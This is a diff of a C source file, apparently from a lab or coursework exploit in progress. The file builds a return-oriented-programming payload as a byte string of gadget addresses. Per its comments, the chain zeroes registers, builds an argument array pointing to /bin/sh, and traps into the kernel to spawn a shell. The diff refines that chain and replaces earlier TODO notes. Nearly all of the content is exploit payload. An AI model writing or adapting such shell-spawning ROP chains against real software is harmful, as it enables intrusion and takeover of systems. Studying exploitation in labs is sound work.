@@ -14,19 +14,23 @@ int main(void)
                       "\x09\x09\x09\x09"
                       "\x68\x07\xAD\xBB"
                       "\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB"
-                      "\xD4\xBE\xB3\xBB"//\xD5\x15\xAC\xBB"//\xCC\x9D\xB8\xBB"//\xD5\x15\xAC\xBB" // 0 out edx then add 4 to esp
+                      "\xD4\xBE\xB3\xBB" // 0 out edx
+                      //\xD5\x15\xAC\xBB"//\xCC\x9D\xB8\xBB"//\xD5\x15\xAC\xBB" // 0 out edx then add 4 to esp
                       //"\xDBBB3BED4"
-                      "\x22\xA4\xBA\xBB\xAA\xAA\xAA\xAA" // pop esp into ecx (future address of 00000000 byte?) then move edx (0 byte) to addy stored at ecx
+                      "\x22\xA4\xBA\xBB\xAA\xAA\xAA\xAA" // pop esp into ecx (future address of 0 word) then move edx (0 word) to addy stored at ecx
+                      "\x7E\xB8\xB6\xBB" // move edx (0 word to y array)
+                      "\x62\x26\xB4\xBB" // skip over y array (inc esp by 8)
+                      "\xf6\xf6\xb7\xbb\xAA\xAA\xAA\xAA" // y array (addy of bin/sh followed by 0 word represented here by filler)
                       //"\xf6\xf6\xb7\xbb\xCC\x9D\xB8\xBB"//\x09\x09\x09\x09" // addy of /bin/sh and push edx (00000000) 
                       "\xf6\xf6\xb7\xbb\x34\x7E\xAE\xBB" // addy of \bin/sh and push edx?
                       //"\xf6\xf6\xb7\xbb\xC6\x14\xAC\xBB" // addy of bin/sh and move ecx to esp
-                      "\x68\x8B\xAA\xBB" // skip params on stack
-                      "\xf6\xf6\xb7\xbb\xc8\x28\xbf\xbf\xcc\x28\xbf\xbf" // addy of bin/sh addy of y (above) addy of y + 4
-                      "\xE5\xB6\xA9\xBB\x09\x09\x09\x09");// trap into kernel followed by dummy value
-                      // TODO : move stack pointer to addy above, push edx to stack
-                      // TODO : add addy of bin/sh to stack followed by addy above
-                      // TODO : push edx to stack
-                      // TODO : int 80
+                      // "\x68\x8B\xAA\xBB" // skip params on stack
+                      // "\xf6\xf6\xb7\xbb\xc8\x28\xbf\xbf\xcc\x28\xbf\xbf" // addy of bin/sh addy of y (above) addy of y + 4
+                      "\xE5\xB6\xA9\xBB" // trap into kernel followed by
+                      "\xAA\xAA\xAA\xAA" // dummy value
+                      "\xf6\xf6\xb7\xbb" // addy of bin/sh (x) 
+                      "\xAA\xAA\xAA\xAA" // addy of y
+                      "\xAA\xAA\xAA\xAA"); // addy of y + 4
   
   return 0;
 }
